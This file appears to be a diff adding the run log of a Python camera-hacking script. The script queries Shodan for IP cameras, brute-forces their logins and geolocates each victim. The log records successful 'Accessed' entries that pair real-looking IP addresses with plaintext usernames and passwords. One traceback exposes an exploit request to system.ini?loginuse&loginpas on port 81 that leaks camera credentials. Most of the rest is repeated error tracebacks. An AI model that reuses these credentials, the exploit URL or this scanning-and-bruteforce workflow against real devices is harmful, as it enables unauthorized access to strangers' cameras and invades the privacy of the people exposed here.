@@ -1,0 +1,561 @@
+INFO:root:2023-04-10 00:30:57.844862: Program started.
+
+INFO:root:[2023-04-10 00:31:20.637295]: Modules imported successfully.
+
+INFO:root:[2023-04-10 00:31:20.773520]: Search operation started without arguments.
+
+INFO:root:[2023-04-10 00:31:24.906261]: Received camera data from Shodan.
+
+INFO:root:[2023-04-10 00:31:24.907262]: Camera sweeps have begun.
+
+ERROR:root:[2023-04-10 00:31:25.409794]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:25.959691]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:26.721130]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:27.114604]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:27.565118]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:28.060611]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:29.187261]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:29.398477]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:31.089479]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:33.645899]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:34.118862]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:34.698694]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:35.193090]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:37.594634]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:38.199680]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:39.361454]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:40.654767]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:41.588812]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:42.100729]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:43.038062]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:43.527683]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:44.053298]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:44.655971]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:45.190365]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:45.761834]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:46.288916]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:46.744559]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:47.901453]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:48.214419]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:48.821112]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:49.407341]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:50.020728]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:51.128319]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:51.532355]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:52.181994]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:52.713123]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:53.204653]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:53.707273]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:54.242829]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:54.655823]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:55.225554]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:56.167749]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:56.660946]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:56.768096]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:57.242919]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:57.911697]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:31:58.366707]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:32:01.156280]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:32:01.697968]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:32:02.238440]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:32:03.167854]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:32:04.336268]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:32:06.951863]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:32:07.729632]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:32:07.859839]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+ERROR:root:[2023-04-10 00:32:08.910044]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 409, in st
+    exit()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\_sitebuiltins.py", line 26, in __call__
+    raise SystemExit(code)
+SystemExit: None
+
+INFO:root:2023-04-10 00:32:39.073585: Program started.
+
+INFO:root:[2023-04-10 00:32:55.104274]: Modules imported successfully.
+
+INFO:root:[2023-04-10 00:32:55.225995]: Search operation started without arguments.
+
+INFO:root:[2023-04-10 00:32:57.042415]: Received camera data from Shodan.
+
+INFO:root:[2023-04-10 00:32:57.042415]: Camera sweeps have begun.
+
+INFO:root:2023-04-10 00:33:17.840153: Program started.
+
+INFO:root:[2023-04-10 00:33:34.467219]: Modules imported successfully.
+
+INFO:root:[2023-04-10 00:33:34.655981]: Search operation started without arguments.
+
+INFO:root:[2023-04-10 00:33:35.949873]: Received camera data from Shodan.
+
+INFO:root:[2023-04-10 00:33:35.949873]: Camera sweeps have begun.
+
+INFO:root:[2023-04-10 00:34:19.302972]: Bruteforce started.
+
+INFO:root:[2023-04-10 00:34:56.502496]: Accessed: 189.142.139.198, ('didy', 'ruperto')
+
+INFO:geocoder.base:Requested http://ipinfo.io/189.142.139.198/json
+INFO:root:[2023-04-10 00:35:11.594226]: Accessed: 151.41.235.125, ('Mariano', 'Palermo21')
+
+INFO:geocoder.base:Requested http://ipinfo.io/151.41.235.125/json
+INFO:root:[2023-04-10 00:35:11.900693]: Shutdown
+
+INFO:root:2023-04-10 00:41:33.963147: Program started.
+
+INFO:root:[2023-04-10 00:41:54.728425]: Modules imported successfully.
+
+INFO:root:[2023-04-10 00:41:54.850342]: Search operation started without arguments.
+
+INFO:root:[2023-04-10 00:41:55.918701]: Received camera data from Shodan.
+
+INFO:root:[2023-04-10 00:41:55.918701]: Camera sweeps have begun.
+
+ERROR:root:[2023-04-10 00:42:22.669750]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 426, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 421, in _make_request
+    httplib_response = conn.getresponse()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1347, in getresponse
+    response.begin()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 307, in begin
+    version, status, reason = self._read_status()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 268, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 410, in increment
+    raise six.reraise(type(error), error, _stacktrace)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\packages\six.py", line 735, in reraise
+    raise value
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 428, in _make_request
+    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 335, in _raise_timeout
+    raise ReadTimeoutError(
+urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='47.100.232.30', port=81): Read timed out. (read timeout=10)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 399, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 529, in send
+    raise ReadTimeout(e, request=request)
+requests.exceptions.ReadTimeout: HTTPConnectionPool(host='47.100.232.30', port=81): Read timed out. (read timeout=10)
+
+INFO:root:[2023-04-10 00:42:46.732840]: Bruteforce started.
+
+INFO:root:[2023-04-10 00:43:01.788473]: Accessed: 151.41.235.125 ('Mariano', 'Palermo21')
+
+INFO:geocoder.base:Requested http://ipinfo.io/151.41.235.125/json
+INFO:root:[2023-04-10 00:43:38.802363]: Accessed: 189.142.139.198 ('didy', 'ruperto')
+
+INFO:geocoder.base:Requested http://ipinfo.io/189.142.139.198/json
+INFO:root:[2023-04-10 00:43:40.142067]: Shutdown
+
